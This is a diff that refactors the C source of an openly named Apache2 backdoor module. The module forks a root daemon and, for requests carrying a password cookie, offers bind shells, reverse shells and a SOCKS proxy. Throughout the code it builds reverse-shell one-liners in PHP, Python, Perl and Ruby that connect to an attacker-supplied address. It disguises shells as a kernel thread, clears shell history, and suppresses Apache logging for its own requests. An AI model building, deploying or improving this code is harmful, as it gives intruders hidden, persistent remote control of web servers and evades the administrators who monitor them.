@@ -1,7 +1,5 @@
-// ------------------------------------
-// Apache2 Backdoor module (@RicoVlad) 
-// ------------------------------------
 /*
+ * Apache2 Backdoor module (@RicoVlad)
  * Forks a root daemon on config load, exposing backdoor features via HTTP
  * endpoints (bind shell, reverse shell, SOCKS5 proxy, ping). Uses a Unix-domain
  * IPC socket to relay requests from the Apache worker process to the forked daemon.
@@ -24,8 +22,8 @@
 #include <sys/stat.h>
 #include <sys/un.h>
 
-#include <pty.h>    // forkpty() - link with -lutil 
-#include <sys/mount.h>
+#include <pty.h>    /* forkpty() - link with -lutil */
+#include <sys/mount.h>  /* cgroup2 mount for process isolation */
 
 #ifdef NO_SYSTEMD
 #include <sys/prctl.h>
@@ -40,17 +38,11 @@
 
 #include "socks.h"
 
-// ------------------------------------------------------------------ 
-// Constants                                                          
-// ------------------------------------------------------------------ 
+/* ------------------------------------------------------------------ */
+/* Constants                                                          */
+/* ------------------------------------------------------------------ */
 
 #define PASSWORD      "password=backdoor"
-#define SOCKSWORD     "/proxy"
-#define STOPPROXY     "imdonewithyou"
-#define PINGWORD      "/ping"
-#define SHELLWORD     "/revtty"
-#define REVERSESHELL  "/reverse"
-#define BINDWORD      "/bind"
 #define CGROUP2       "/tmp/cgroup2"
 #ifdef NO_SYSTEMD
 #define IPC           "/var/run/mod_backdoor.sock"
@@ -58,12 +50,12 @@
 #define IPC           "/tmp/mod_backdoor"
 #endif
 
-// PID of the forked IPC daemon (set in backdoor_post_config) 
+// PID of the forked IPC daemon (set in backdoor_post_config)
 pid_t pid;
 
-// ------------------------------------------------------------------ 
-// URI parsing types and functions                                    
-// ------------------------------------------------------------------ 
+/* ------------------------------------------------------------------ */
+/* Command types & URI parser                                         */
+/* ------------------------------------------------------------------ */
 
 typedef enum {
     CMD_PING,
@@ -93,11 +85,6 @@ static cmd_t classify_uri(const char *uri) {
     return CMD_UNKNOWN;
 }
 
-static char *safe_strdup(const char *s) {
-    if (!s) return NULL;
-    return strdup(s);
-}
-
 static int parse_uri(const char *uri, parsed_cmd_t *out) {
     if (!uri || !out) return -1;
 
@@ -113,45 +100,45 @@ static int parse_uri(const char *uri, parsed_cmd_t *out) {
         break;
 
     case CMD_SOCKS: {
-        strtok(copy, "/");  // skip "proxy" 
+        strtok(copy, "/");
         char *port = strtok(NULL, "/");
         if (!port) { free(copy); out->type = CMD_UNKNOWN; return -1; }
-        out->port = safe_strdup(port);
+        out->port = strdup(port);
         out->port_num = atoi(port);
         char *user = strtok(NULL, "/");
-        if (user) out->user = safe_strdup(user);
+        if (user) out->user = strdup(user);
         break;
     }
 
     case CMD_BIND: {
-        strtok(copy, "/");  // skip "bind" 
+        strtok(copy, "/");
         char *port = strtok(NULL, "/");
         if (!port) { free(copy); out->type = CMD_UNKNOWN; return -1; }
-        out->port = safe_strdup(port);
+        out->port = strdup(port);
         out->port_num = atoi(port);
         break;
     }
 
     case CMD_REVSHELL: {
-        strtok(copy, "/");  // skip "reverse" 
+        strtok(copy, "/");
         char *ip = strtok(NULL, "/");
         char *port = strtok(NULL, "/");
         char *prog = strtok(NULL, "/");
         if (!ip || !port || !prog) { free(copy); out->type = CMD_UNKNOWN; return -1; }
-        out->ip = safe_strdup(ip);
-        out->port = safe_strdup(port);
-        out->prog = safe_strdup(prog);
+        out->ip = strdup(ip);
+        out->port = strdup(port);
+        out->prog = strdup(prog);
         out->port_num = atoi(port);
         break;
     }
 
     case CMD_REVTY: {
-        strtok(copy, "/");  // skip "revtty" 
+        strtok(copy, "/");
         char *ip = strtok(NULL, "/");
         char *port = strtok(NULL, "/");
         if (!ip || !port) { free(copy); out->type = CMD_UNKNOWN; return -1; }
-        out->ip = safe_strdup(ip);
-        out->port = safe_strdup(port);
+        out->ip = strdup(ip);
+        out->port = strdup(port);
         out->port_num = atoi(port);
         break;
     }
@@ -174,10 +161,6 @@ static void free_parsed_cmd(parsed_cmd_t *cmd) {
     memset(cmd, 0, sizeof(*cmd));
 }
 
-// ------------------------------------------------------------------ 
-// Reverse shell helpers                                              
-// ------------------------------------------------------------------ 
-
 /*
  * Spawn a TTY reverse shell. Forks a child that connects to (ip:port),
  * then execs the requested shell binary. argv is set to a fake process
@@ -188,12 +171,12 @@ static void shell(char *ip, char *port, char *prog) {
     if (spid < 0) exit(0);
     if (spid != 0) { exit(0); }
 
-    // Child process 
-    #ifdef NO_SYSTEMD
+    // Child process
+#ifdef NO_SYSTEMD
     char *argv[] = { "sh", 0 };
-    #else
+#else
     char *argv[] = { "[kintegrityd/2]", 0 };
-    #endif
+#endif
     char *envp[] = { "HISTFILE=", "TERM=vt100", 0 };
     setsid();
 
@@ -212,7 +195,7 @@ static void shell(char *ip, char *port, char *prog) {
     dup2(revsockfd, 1);
     dup2(revsockfd, 2);
 
-    // execve never returns on success 
+    // execve never returns on success
     if (!strcmp(prog, "sh"))    execve("/bin/sh", argv, envp);
     if (!strcmp(prog, "bash"))  execve("/bin/bash", argv, envp);
     if (!strcmp(prog, "dash"))  execve("/bin/dash", argv, envp);
@@ -223,11 +206,11 @@ static void shell(char *ip, char *port, char *prog) {
 
 /*
  * Spawn a reverse shell. For TTY shells (sh, bash, etc.) delegates to
- * shell(). For interpreter-based shells (python, php, perl, ruby) builds
+ * shell(). For interpreter-based shells (php, python, perl, ruby) builds
  * a one-liner that opens a socket and execs /bin/sh.
  */
 static void reverseShell(char *ip, char *port, char *prog) {
-    // Delegate TTY shells to the pty-based handler 
+    // Delegate TTY shells to the pty-based handler
     if (!strcmp(prog, "sh") || !strcmp(prog, "bash") || !strcmp(prog, "dash") ||
         !strcmp(prog, "tcsh") || !strcmp(prog, "ash") || !strcmp(prog, "ksh")) {
         shell(ip, port, prog);
@@ -241,33 +224,33 @@ static void reverseShell(char *ip, char *port, char *prog) {
     }
     if (spid != 0) { exit(0); }
 
-    // Child process - interpreter-based reverse shells 
+    // Child process - interpreter-based reverse shells
     if (!strcmp(prog, "php")) {
         char *args[] = {"/usr/bin/php", "-r", "", NULL};
-        args[2] = malloc(strlen("$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");")+strlen(ip)+strlen(port)+1);
+        args[2] = malloc(strlen("$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");") + strlen(ip) + strlen(port) + 1);
         sprintf(args[2], "$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");", ip, port);
         execve(args[0], args, NULL);
     } else if (!strcmp(prog, "python")) {
         char *args[] = {"/usr/bin/python", "-c", "", NULL};
-        args[2] = malloc(strlen("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);")+strlen(ip)+strlen(port)+1);
+        args[2] = malloc(strlen("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);") + strlen(ip) + strlen(port) + 1);
         sprintf(args[2], "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);", ip, port);
         execve(args[0], args, NULL);
     } else if (!strcmp(prog, "perl")) {
         char *args[] = {"/usr/bin/perl", "-e", "", NULL};
-        args[2] = malloc(1+strlen(ip)+strlen(port)+strlen("use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"));
+        args[2] = malloc(1 + strlen(ip) + strlen(port) + strlen("use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"));
         sprintf(args[2], "use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};", ip, port);
         execve(args[0], args, NULL);
     } else if (!strcmp(prog, "ruby")) {
         char *args[] = {"/usr/bin/ruby", "-rsocket", "-e", "", NULL};
-        args[3] = malloc(1+strlen(ip)+strlen(port)+strlen("exit if fork;c=TCPSocket.new(\"%s\",\"%s\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end"));
+        args[3] = malloc(1 + strlen(ip) + strlen(port) + strlen("exit if fork;c=TCPSocket.new(\"%s\",\"%s\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end"));
         sprintf(args[3], "exit if fork;c=TCPSocket.new(\"%s\",\"%s\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end", ip, port);
         execve(args[0], args, NULL);
     }
 }
 
-// ------------------------------------------------------------------ 
-// Pseudo-terminal reverse shell                                      
-// ------------------------------------------------------------------ 
+/* ------------------------------------------------------------------ */
+/* Pseudo-terminal reverse shell                                      */
+/* ------------------------------------------------------------------ */
 
 /*
  * TTY reverse shell using forkpty. Forks a child with a pseudo-terminal,
@@ -287,28 +270,29 @@ static void shellPTY(int socket) {
     }
 
     if (fpid == 0) {
-        // Child: exec a shell on the pty slave 
-      #ifdef NO_SYSTEMD
-      char *argv[] = { "sh", 0 };
-      #else
-      char *argv[] = { "[kintegrityd/2]", 0 };
-      #endif
-      char *envp[] = { "HISTFILE=", "TERM=vt100", 0 };
-      execve("/bin/sh", argv, envp);
+        // Child: exec a shell on the pty slave
+#ifdef NO_SYSTEMD
+        char *argv[] = { "sh", 0 };
+#else
+        char *argv[] = { "[kintegrityd/2]", 0 };
+#endif
+        char *envp[] = { "HISTFILE=", "TERM=vt100", 0 };
+        execve("/bin/sh", argv, envp);
     }
 
-    // Parent: configure terminal, drain pty garbage, then relay 
+    // Parent: configure terminal, then relay data
     tcgetattr(terminalfd, &terminal);
     terminal.c_lflag &= ~ECHO;
     tcsetattr(terminalfd, TCSANOW, &terminal);
 
     fd_set readfd;
+    int maxfd = terminalfd > socket ? terminalfd : socket;
     for (;;) {
         FD_ZERO(&readfd);
         FD_SET(terminalfd, &readfd);
         FD_SET(socket, &readfd);
-        int sel = select(terminalfd + 1, &readfd, NULL, NULL, NULL);
-        if (!sel) continue;
+        int sel = select(maxfd + 1, &readfd, NULL, NULL, NULL);
+        if (sel <= 0) continue;
         if (FD_ISSET(terminalfd, &readfd)) {
             int n = read(terminalfd, buf, sizeof buf);
             if (n <= 0) { kill(fpid, SIGKILL); break; }
@@ -324,9 +308,9 @@ static void shellPTY(int socket) {
     exit(0);
 }
 
-// ------------------------------------------------------------------ 
-// Bind shell helpers                                                 
-// ------------------------------------------------------------------ 
+/* ------------------------------------------------------------------ */
+/* Bind shell helpers                                                 */
+/* ------------------------------------------------------------------ */
 
 /*
  * Bind a TCP port and return the listening socket fd. Sends error
@@ -363,9 +347,9 @@ static int bindPort(int client_fd, int port) {
     return bindSock;
 }
 
-// ------------------------------------------------------------------ 
-// IPC relay                                                          
-// ------------------------------------------------------------------ 
+/* ------------------------------------------------------------------ */
+/* IPC relay                                                          */
+/* ------------------------------------------------------------------ */
 
 /*
  * Bidirectional data relay between two file descriptors using select().
@@ -374,12 +358,12 @@ static int bindPort(int client_fd, int port) {
 static void bicomIPC(int sock, int revsockfd) {
     char buf[1024];
     fd_set readset;
+    int maxfd = sock > revsockfd ? sock : revsockfd;
     for (;;) {
         FD_ZERO(&readset);
         FD_SET(sock, &readset);
         FD_SET(revsockfd, &readset);
-        // select <= 0: timeout or error (EINTR) - just retry 
-        if (select(sock + 1, &readset, NULL, NULL, NULL) <= 0) continue;
+        if (select(maxfd + 1, &readset, NULL, NULL, NULL) <= 0) continue;
         if (FD_ISSET(sock, &readset)) {
             int n = read(sock, buf, sizeof buf);
             if (n <= 0) break;
@@ -393,11 +377,11 @@ static void bicomIPC(int sock, int revsockfd) {
     }
 }
 
-// ------------------------------------------------------------------ 
-// Apache connection helpers                                          
-// ------------------------------------------------------------------ 
+/* ------------------------------------------------------------------ */
+/* Apache helpers                                                     */
+/* ------------------------------------------------------------------ */
 
-// Extract the raw socket fd from the Apache request connection 
+// Extract raw socket fd from the Apache request connection
 static int get_client_fd(request_rec *r) {
     apr_os_sock_t os_fd;
     apr_socket_t *sock = ap_get_conn_socket(r->connection);
@@ -406,7 +390,7 @@ static int get_client_fd(request_rec *r) {
     return (int)os_fd;
 }
 
-// Connect to the IPC daemon's Unix domain socket 
+// Connect to the IPC daemon's Unix domain socket
 static int connect_ipc(void) {
     int sock = socket(AF_UNIX, SOCK_STREAM, 0);
     if (sock < 0) return -1;
@@ -420,71 +404,62 @@ static int connect_ipc(void) {
     return sock;
 }
 
-// Send error response, close the socket, and exit the process 
+// Send error response, close socket, and exit the process
 static void send_error_to_client(int fd, const char *msg) {
     write(fd, msg, strlen(msg));
     close(fd);
     exit(0);
 }
 
-// ------------------------------------------------------------------ 
-// HTTP request handlers                                              
-// ------------------------------------------------------------------ 
+/* ------------------------------------------------------------------ */
+/* HTTP request handlers                                              */
+/* ------------------------------------------------------------------ */
 
-/*
- * SOCKS5 proxy handler. Forwards the URI to the IPC daemon which
- * starts a proxy listener.
- */
-static void handle_socks_request(request_rec *r, int client_fd) {
+// Start SOCKS5 proxy via IPC daemon
+static void handle_socks_request(int client_fd, parsed_cmd_t *cmd) {
     int ipc_sock = connect_ipc();
     if (ipc_sock < 0) {
         send_error_to_client(client_fd, "ERRNOSOCK\n");
     }
-    write(ipc_sock, r->uri, strlen(r->uri));
+    char msg[512];
+    snprintf(msg, sizeof(msg), "/proxy/%d/%s", cmd->port_num, cmd->user ? cmd->user : "");
+    write(ipc_sock, msg, strlen(msg));
     write(client_fd, "[+] Socks proxy binded !\n", strlen("[+] Socks proxy binded !\n"));
     close(client_fd);
     close(ipc_sock);
 }
 
-/*
- * Bind shell handler. Binds a listening socket on the parsed port,
- * accepts a connection, then relays data between the connected socket
- * and the IPC daemon.
- */
-static void handle_bind_request(request_rec *r, int client_fd) {
-    parsed_cmd_t cmd;
-    if (parse_uri(r->uri, &cmd) != 0 || cmd.type != CMD_BIND || !cmd.port) {
+// Bind shell: listen on port, accept connection, relay via IPC
+static void handle_bind_request(int client_fd, parsed_cmd_t *cmd) {
+    if (!cmd->port) {
         send_error_to_client(client_fd, "ERR\n");
     }
 
     int ipc_sock = connect_ipc();
     if (ipc_sock < 0) {
-        free_parsed_cmd(&cmd);
         send_error_to_client(client_fd, "ERRNOSOCK\n");
     }
 
-    int bindfd = bindPort(client_fd, cmd.port_num);
-    char *info = malloc(strlen("[+] Shell binded on port \n") + strlen(cmd.port) + 1);
-    sprintf(info, "[+] Shell binded on port %s\n", cmd.port);
+    int bindfd = bindPort(client_fd, cmd->port_num);
+    char info[256];
+    snprintf(info, sizeof(info), "[+] Shell binded on port %s\n", cmd->port);
     write(client_fd, info, strlen(info));
-    free(info);
     close(client_fd);
 
     struct sockaddr_in server_addr;
     socklen_t server_len = sizeof(server_addr);
     server_addr.sin_family = AF_INET;
     server_addr.sin_addr.s_addr = INADDR_ANY;
-    server_addr.sin_port = htons(cmd.port_num);
+    server_addr.sin_port = htons(cmd->port_num);
 
     int new_socket = accept(bindfd, (struct sockaddr *)&server_addr, &server_len);
     close(bindfd);
     write(ipc_sock, "BIND", strlen("BIND"));
     bicomIPC(ipc_sock, new_socket);
     close(new_socket);
-    free_parsed_cmd(&cmd);
 }
 
-// Health check endpoint 
+// Health check endpoint
 static void handle_ping_request(int client_fd) {
     write(client_fd, "[+] Backdoor module is running !\n",
           strlen("[+] Backdoor module is running !\n"));
@@ -492,103 +467,85 @@ static void handle_ping_request(int client_fd) {
     exit(0);
 }
 
-/*
- * Non-TTY reverse shell handler. Forwards the full URI to the IPC daemon
- * which parses it and spawns the appropriate reverse shell.
- */
-static void handle_reverse_shell_request(request_rec *r, int client_fd) {
-    parsed_cmd_t cmd;
-    if (parse_uri(r->uri, &cmd) != 0 || cmd.type != CMD_REVSHELL
-        || !cmd.ip || !cmd.port || !cmd.prog) {
+// Non-TTY reverse shell: forward to IPC daemon for spawning
+static void handle_reverse_shell_request(int client_fd, parsed_cmd_t *cmd) {
+    if (!cmd->ip || !cmd->port || !cmd->prog) {
         send_error_to_client(client_fd, "ERR\n");
     }
 
     int ipc_sock = connect_ipc();
     if (ipc_sock < 0) {
-        free_parsed_cmd(&cmd);
         send_error_to_client(client_fd, "ERRNOSOCK\n");
     }
-    write(ipc_sock, r->uri, strlen(r->uri));
+    char msg[512];
+    snprintf(msg, sizeof(msg), "/reverse/%s/%s/%s", cmd->ip, cmd->port, cmd->prog);
+    write(ipc_sock, msg, strlen(msg));
 
-    char *info = malloc(strlen("[+] Sending Reverse Shell to : using \n")
-                        + strlen(cmd.ip) + strlen(cmd.port) + strlen(cmd.prog) + 1);
-    sprintf(info, "[+] Sending Reverse Shell to %s:%s using %s\n", cmd.ip, cmd.port, cmd.prog);
+    char info[512];
+    snprintf(info, sizeof(info), "[+] Sending Reverse Shell to %s:%s using %s\n", cmd->ip, cmd->port, cmd->prog);
     write(client_fd, info, strlen(info));
-    free(info);
-    free_parsed_cmd(&cmd);
     close(client_fd);
     exit(0);
 }
 
-/*
- * TTY reverse shell handler. Opens a socket to the target (ip:port),
- * connects to the IPC daemon, and relays bidirectional data between
- * the two sockets.
- */
-static void handle_revtty_request(request_rec *r, int client_fd) {
-    if (!pid) return;
-
-    parsed_cmd_t cmd;
-    if (parse_uri(r->uri, &cmd) != 0 || cmd.type != CMD_REVTY
-        || !cmd.ip || !cmd.port) {
+// TTY reverse shell: connect to target, relay via IPC
+static void handle_revtty_request(int client_fd, parsed_cmd_t *cmd) {
+    if (!cmd->ip || !cmd->port) {
         send_error_to_client(client_fd, "ERR\n");
     }
 
     int revsockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (revsockfd < 0) {
-        free_parsed_cmd(&cmd);
         send_error_to_client(client_fd, "ERRNOSOCK\n");
     }
     struct sockaddr_in client_addr;
-    client_addr.sin_addr.s_addr = inet_addr(cmd.ip);
+    client_addr.sin_addr.s_addr = inet_addr(cmd->ip);
     client_addr.sin_family = AF_INET;
-    client_addr.sin_port = htons(cmd.port_num);
+    client_addr.sin_port = htons(cmd->port_num);
     if (connect(revsockfd, (struct sockaddr *)&client_addr, sizeof(client_addr)) < 0) {
-        free_parsed_cmd(&cmd);
         send_error_to_client(client_fd, "[+] Reverse socket can't connect to client\n");
     }
 
     int ipc_sock = connect_ipc();
     if (ipc_sock < 0) {
-        free_parsed_cmd(&cmd);
         send_error_to_client(client_fd, "ERRNOSOCK\n");
     }
     write(ipc_sock, "SHELL\n", strlen("SHELL\n") + 1);
 
-    char *info = malloc(strlen("[+] Sending Reverse Shell to :")
-                        + strlen(cmd.ip) + strlen(cmd.port) + 1);
-    sprintf(info, "[+] Sending Reverse Shell to %s:%s", cmd.ip, cmd.port);
+    char info[256];
+    snprintf(info, sizeof(info), "[+] Sending Reverse Shell to %s:%s", cmd->ip, cmd->port);
     write(client_fd, info, strlen(info));
-    free(info);
-    free_parsed_cmd(&cmd);
     bicomIPC(ipc_sock, revsockfd);
     close(client_fd);
     exit(0);
 }
 
-// ------------------------------------------------------------------ 
-// Apache hook: post-read-request                                     
-// ------------------------------------------------------------------ 
+/* ------------------------------------------------------------------ */
+/* Authentication                                                     */
+/* ------------------------------------------------------------------ */
+
+// Check for password cookie in request headers
+static int has_auth_cookie(request_rec *r) {
+    const apr_array_header_t *fields = apr_table_elts(r->headers_in);
+    apr_table_entry_t *e = (apr_table_entry_t *)fields->elts;
+    for (int i = 0; i < fields->nelts; i++) {
+        if (!strcmp(e[i].key, "Cookie") && strstr(e[i].val, PASSWORD)) {
+            return 1;
+        }
+    }
+    return 0;
+}
+
+/* ------------------------------------------------------------------ */
+/* Apache hook: post-read-request                                     */
+/* ------------------------------------------------------------------ */
 
 /*
- * Intercepts every HTTP request. Checks for the password cookie,
+ * Intercepts HTTP requests. Checks for the password cookie,
  * then dispatches to the appropriate handler based on the URI.
  */
 static int backdoor_post_read_request(request_rec *r) {
-    const apr_array_header_t *fields;
-    apr_table_entry_t *e;
-    int i;
-
-    fields = apr_table_elts(r->headers_in);
-    e = (apr_table_entry_t *) fields->elts;
-    for (i = 0; i < fields->nelts; i++) {
-        if (!strcmp(e[i].key, "Cookie") && strstr(e[i].val, PASSWORD)) {
-            break;
-        }
-    }
-    if (i >= fields->nelts) {
-        return DECLINED;
-    }
+    if (!has_auth_cookie(r)) return DECLINED;
 
     int client_fd = get_client_fd(r);
     if (client_fd < 0) return DECLINED;
@@ -601,31 +558,31 @@ static int backdoor_post_read_request(request_rec *r) {
         handle_ping_request(client_fd);
         break;
     case CMD_SOCKS:
-        handle_socks_request(r, client_fd);
+        handle_socks_request(client_fd, &cmd);
         break;
     case CMD_BIND:
-        handle_bind_request(r, client_fd);
+        handle_bind_request(client_fd, &cmd);
         break;
     case CMD_REVSHELL:
-        handle_reverse_shell_request(r, client_fd);
+        handle_reverse_shell_request(client_fd, &cmd);
         break;
     case CMD_REVTY:
-        handle_revtty_request(r, client_fd);
+        handle_revtty_request(client_fd, &cmd);
         break;
     default:
-        free_parsed_cmd(&cmd);
-        return DECLINED;
+        break;
     }
 
+    free_parsed_cmd(&cmd);
     return DECLINED;
 }
 
-// ------------------------------------------------------------------ 
-// IPC daemon management                                              
-// ------------------------------------------------------------------ 
+/* ------------------------------------------------------------------ */
+/* Daemon lifecycle                                                   */
+/* ------------------------------------------------------------------ */
 
 #ifdef NO_SYSTEMD
-// Clean up IPC socket and exit when parent Apache dies (PDEATHSIG) 
+// Cleanup handler: remove IPC socket on SIGTERM
 static void backdoor_daemon_cleanup(int sig) {
     (void)sig;
     unlink(IPC);
@@ -640,33 +597,27 @@ static void backdoor_daemon_cleanup(int sig) {
  */
 static void rmCgroup(void) {
     int fd;
-    int isMounted = 0;
-    char *path = malloc(strlen(CGROUP2) + strlen("/system.slice/cgroup.procs") + 1);
-    char *str;
-
-    strcpy(path, CGROUP2);
-    strcat(path, "/system.slice/cgroup.procs");
+    char path[256];
+    snprintf(path, sizeof(path), "%s/system.slice/cgroup.procs", CGROUP2);
 
     if (access(path, F_OK) < 0) {
         mount("cgroup", CGROUP2, "cgroup2", 0, 0);
     }
     if ((fd = open(path, O_WRONLY)) != -1) {
-        str = malloc(32);
-        sprintf(str, "%d", getpid());
+        char str[32];
+        snprintf(str, sizeof(str), "%d", getpid());
         write(fd, str, strlen(str));
         close(fd);
-        free(str);
     }
     if (umount(CGROUP2) == 0) {
         rmdir(CGROUP2);
     }
-    free(path);
 }
 
 /*
  * IPC daemon main loop. Accepts connections on the Unix domain socket,
- * forks a child to handle each request (SHELL, BIND, reverse shell,
- * or SOCKS proxy), and forks another child to continue accepting.
+ * forks a child to handle each request, and forks another child to
+ * continue accepting (recursive acceptor pattern).
  */
 static int waitIPC(int master) {
     fd_set readfds;
@@ -688,14 +639,26 @@ static int waitIPC(int master) {
                 continue;
             }
 
-            // Fork handler for this request 
+            // Fork handler for this request
+            int ready_pipe[2];
+#ifdef NO_SYSTEMD
+            pipe(ready_pipe);
+#endif
             pid_t handler = fork();
             if (handler == 0) {
+#ifdef NO_SYSTEMD
+                // Reset death signal so handler survives daemon termination
+                prctl(PR_SET_PDEATHSIG, 0);
+                signal(SIGTERM, SIG_DFL);
+                char c = 1;
+                write(ready_pipe[1], &c, 1);
+                close(ready_pipe[1]);
+                close(ready_pipe[0]);
+#endif
                 if (strstr(buf, "SHELL") || strstr(buf, "BIND")) {
                     rmCgroup();
                     shellPTY(sd);
                 } else {
-                    // Parse URI from IPC message 
                     parsed_cmd_t cmd;
                     if (parse_uri(buf, &cmd) == 0) {
                         if (cmd.type == CMD_REVSHELL) {
@@ -709,72 +672,83 @@ static int waitIPC(int master) {
                 }
                 exit(0);
             }
-            // Parent: fork a new acceptor to keep listening 
+
+#ifdef NO_SYSTEMD
+            close(ready_pipe[1]);
+#endif
+            // Fork new acceptor to keep the main loop running
             pid_t acceptor = fork();
             if (acceptor == 0) {
+#ifdef NO_SYSTEMD
+                prctl(PR_SET_PDEATHSIG, 0);
+                char c;
+                read(ready_pipe[0], &c, 1);
+                prctl(PR_SET_PDEATHSIG, SIGTERM);
+                signal(SIGTERM, backdoor_daemon_cleanup);
+#endif
+                close(ready_pipe[0]);
                 waitIPC(master);
             } else {
+#ifdef NO_SYSTEMD
+                close(ready_pipe[0]);
+#endif
                 exit(0);
             }
         }
     }
 }
 
-// ------------------------------------------------------------------ 
-// Apache hook: post-config (daemon fork)                             
-// ------------------------------------------------------------------ 
+/* ------------------------------------------------------------------ */
+/* Apache hook: post-config (daemon fork)                             */
+/* ------------------------------------------------------------------ */
 
 /*
  * Fork the IPC daemon. Parent returns immediately; child creates a
- * Unix domain socket at /tmp/mod_backdoor and enters the accept loop.
+ * Unix domain socket and enters the accept loop.
  */
 int backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, server_rec *s) {
+    (void)pconf; (void)plog; (void)ptemp; (void)s;
+
     pid = fork();
+    // Parent: daemon is forked, return to Apache
     if (pid > 0) {
         return OK;
     }
 
+    // Child: set up death signal for non-systemd cleanup
 #ifdef NO_SYSTEMD
-    // When parent Apache dies, kernel sends SIGTERM to daemon 
     prctl(PR_SET_PDEATHSIG, SIGTERM);
     signal(SIGTERM, backdoor_daemon_cleanup);
 #endif
 
     unlink(IPC);
 
-    int master, rc;
-    struct sockaddr_un serveraddr;
-
-    master = socket(AF_UNIX, SOCK_STREAM, 0);
+    int master = socket(AF_UNIX, SOCK_STREAM, 0);
     if (master < 0) exit(0);
 
+    struct sockaddr_un serveraddr;
     memset(&serveraddr, 0, sizeof(serveraddr));
     serveraddr.sun_family = AF_UNIX;
     strcpy(serveraddr.sun_path, IPC);
-    rc = bind(master, (struct sockaddr *)&serveraddr, SUN_LEN(&serveraddr));
-    if (rc < 0) exit(0);
+    if (bind(master, (struct sockaddr *)&serveraddr, SUN_LEN(&serveraddr)) < 0) exit(0);
     listen(master, 5);
     chmod(serveraddr.sun_path, 0777);
 
     waitIPC(master);
 }
 
-// ------------------------------------------------------------------ 
-// Apache hook: log-transaction                                       
-// ------------------------------------------------------------------ 
+/* ------------------------------------------------------------------ */
+/* Apache hook: log-transaction                                       */
+/* ------------------------------------------------------------------ */
 
 /*
- * Suppress Apache logging for backdoor requests. Also kills the
+ * Suppress Apache logging for backdoor requests. Also exits the
  * worker process to free resources after the response is sent.
  */
 static int backdoor_log_transaction(request_rec *r) {
-    const apr_array_header_t *fields;
-    int i;
-    apr_table_entry_t *e;
-
-    fields = apr_table_elts(r->headers_in);
-    e = (apr_table_entry_t *) fields->elts;
-    for (i = 0; i < fields->nelts; i++) {
+    const apr_array_header_t *fields = apr_table_elts(r->headers_in);
+    apr_table_entry_t *e = (apr_table_entry_t *)fields->elts;
+    for (int i = 0; i < fields->nelts; i++) {
         if (!strcmp(e[i].key, "Cookie")) {
             if (strstr(e[i].val, PASSWORD)) {
                 exit(0);
@@ -784,9 +758,9 @@ static int backdoor_log_transaction(request_rec *r) {
     return DECLINED;
 }
 
-// ------------------------------------------------------------------ 
-// Apache hook: register hooks                                        
-// ------------------------------------------------------------------ 
+/* ------------------------------------------------------------------ */
+/* Apache hook: register hooks                                        */
+/* ------------------------------------------------------------------ */
 
 static void backdoor_register_hooks(apr_pool_t *p) {
     ap_hook_post_read_request(backdoor_post_read_request, NULL, NULL, APR_HOOK_FIRST);
@@ -794,16 +768,16 @@ static void backdoor_register_hooks(apr_pool_t *p) {
     ap_hook_log_transaction(backdoor_log_transaction, NULL, NULL, APR_HOOK_FIRST);
 }
 
-// ------------------------------------------------------------------ 
-// Module definition                                                  
-// ------------------------------------------------------------------ 
+/* ------------------------------------------------------------------ */
+/* Module definition                                                  */
+/* ------------------------------------------------------------------ */
 
 module AP_MODULE_DECLARE_DATA backdoor_module = {
     STANDARD20_MODULE_STUFF,
-    NULL,                 // create per-dir config    
-    NULL,                 // merge per-dir config     
-    NULL,                 // create per-server config 
-    NULL,                 // merge per-server config  
-    NULL,                 // config file commands     
-    backdoor_register_hooks // register hooks         
+    NULL,
+    NULL,
+    NULL,
+    NULL,
+    NULL,
+    backdoor_register_hooks
 };
